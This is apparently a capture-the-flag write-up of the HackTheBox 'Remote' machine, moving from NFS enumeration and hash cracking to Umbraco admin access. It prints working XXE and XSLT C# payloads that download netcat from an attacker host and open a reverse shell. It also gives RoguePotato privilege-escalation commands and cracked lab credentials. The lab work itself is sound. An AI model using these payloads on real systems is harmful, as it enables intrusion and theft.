---
title: HTB [Remote]
date: 2023-01-24 11:28:05 +0200
categories: [windows,nfs,xslt-injection]
tags: [## HACKTHEBOX MACHINES]
excerpt: Remote is an easy machine from hackthebox that involves xslt injection in umbraco cms to get initialfoothold, and SeImpersonatePrivilege for the root
---

![](https://i.imgur.com/4TwYqzQ.png)

## Recon

### portscan

```js
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5h29m58s
| smb2-time:
|   date: 2023-01-24T11:01:52
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52310/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51032/udp): CLEAN (Failed to receive data)
|   Check 4 (port 15893/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

## Initial foothold

- Anonymous login enabled, but no files in FTP
- Let's check NFS

```js
➜  remote showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

- I'm gonna mount this to my local

```bash
➜  remote mkdir remote_mount
➜  remote mount -t nfs 10.10.10.180:/ remote_mount
➜  remote tree -a remote_mount 
<SNIP>
486 directories, 1887 files
```

- The output is huge, so let me snip the output
- They're using Umbraco as the Content management system in their website

![](https://i.imgur.com/tcY0eVm.png)

- I've got this hash **b8be16afba8c314ad33d812f22a04991b90e2aaa** in `App_Data/Umbraco.sdf` file
- Cracking the hash gives the password `baconandcheese`
- Let's login with these creds `admin@htb.local:baconandcheese` at [Umbraco login page](http://10.10.10.180/umbraco/#/login)


## Initial shell

- They're using `Umbraco version 7.12.4` , you can see this in the about page after logging in
- There's an Remote Code Execution vulnerability in this version
- For some reasons I'm gonna do this exploit part manually, coz the exploits available in internet are not working properly
- Let's create a `.xslt` file in `http://10.10.10.180/umbraco/#/developer` tab

> Note: Go through [this](https://www.exploit-db.com/exploits/49488) exploit db page to get some basic understanding about this exploit
    Coz you need to know how it works

![](https://i.imgur.com/rsUGMSF.png)

- Let's create a new file
- Now let's try to do XSLT injection

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\Windows\System32\drivers\etc\hosts">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```

- Using this we can do XXE attack to read local files

![](https://i.imgur.com/pZKA9ah.png)

- Click this button to visualize XSLT

![](https://i.imgur.com/e3ifUQb.png)

- Now click this button

![](https://i.imgur.com/IMkUju3.png)

- Cool we can read `C:\Windows\System32\drivers\etc\hosts`

### XSLT to RCE

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">
		public string xml() { 
		string cmd = "/c curl 10.10.16.3"; 
		System.Diagnostics.Process proc = new System.Diagnostics.Process(); 
		proc.StartInfo.FileName = "cmd.exe"; 
		proc.StartInfo.Arguments = cmd; 
		proc.StartInfo.UseShellExecute = false; 
		proc.StartInfo.RedirectStandardOutput = true; 
		proc.Start(); 
		string output = proc.StandardOutput.ReadToEnd(); 
		return output; 
		}  
	</msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>
```

- I've got this payload from [exploit db](https://www.exploit-db.com/exploits/49488)
- And changed few parts like `string cmd = "/c curl 10.10.16.3"` and `proc.StartInfo.FileName = "cmd.exe";`
- After pasting this click `view xslt` button again

![](https://i.imgur.com/rtq8YrZ.png)

- Here we got a hit in our server
- And you can see the output in the window behind that terminal, `.bashrc` are my local files
- Now let's try to get a reverse shell

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">
		public string xml() {
		string cmd = @"/c dir http://10.10.16.3/nc64.exe -o C:\Users\Public\nc.exe"; 
		System.Diagnostics.Process proc = new System.Diagnostics.Process(); 
		proc.StartInfo.FileName = "cmd.exe"; 
		proc.StartInfo.Arguments = cmd; 
		proc.StartInfo.UseShellExecute = false; 
		proc.StartInfo.RedirectStandardOutput = true; 
		proc.Start(); 
		string output = proc.StandardOutput.ReadToEnd(); 
		return output; 
		}  
	</msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>
```

- Start a webserver and use this payload to download the `nc64.exe` file in `C:\Users\Public\` directory

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">
		public string xml() {
		string cmd = @"/c C:\Users\Public\nc.exe 10.10.16.3 1337 -e cmd.exe"; 
		System.Diagnostics.Process proc = new System.Diagnostics.Process(); 
		proc.StartInfo.FileName = "cmd.exe"; 
		proc.StartInfo.Arguments = cmd; 
		proc.StartInfo.UseShellExecute = false; 
		proc.StartInfo.RedirectStandardOutput = true; 
		proc.Start(); 
		string output = proc.StandardOutput.ReadToEnd(); 
		return output; 
		}  
	</msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>
```

- Then use this payload to get a rev shell

![](https://i.imgur.com/umsecBE.png)

- Time to escalate privillege

## Privesc

![](https://i.imgur.com/QwOf0vZ.png)


- We have `SeImpersonatePrivilege`, so we can upload [RoguePotato](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0) to escalate privilleges
- First we need to use socat to listen on port 135 and portforward it to the machine

```bash
socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
```

> ./RoguePotato.exe -r 10.10.16.3 -e "cmd.exe /c curl 10.10.16.3" -l 9999

![](https://i.imgur.com/jsONQRg.png)

- Cool we have code execution, now time for a rev shell

> ./RoguePotato.exe -r 10.10.16.3 -e "cmd.exe /c nc.exe 10.10.16.3 1337 -e cmd.exe" -l 9999

![](https://i.imgur.com/hwnRLgK.png)

- We got a rev shell :)
- There's an another way to privesc using teamviewer
- If you list the running tasks you can see the machine is running teamviewer 7
- And it's a old version
- You can gather Windows Password using it!
- Use thiis `post/windows/gather/credentials/teamviewer_passwords` msf module to do that

![](https://i.imgur.com/uON8FZQ.png)

- After getting the password, you can login using winrm `Administrator:!R3m0te!`
- Hope you'll like this post :) cya soon
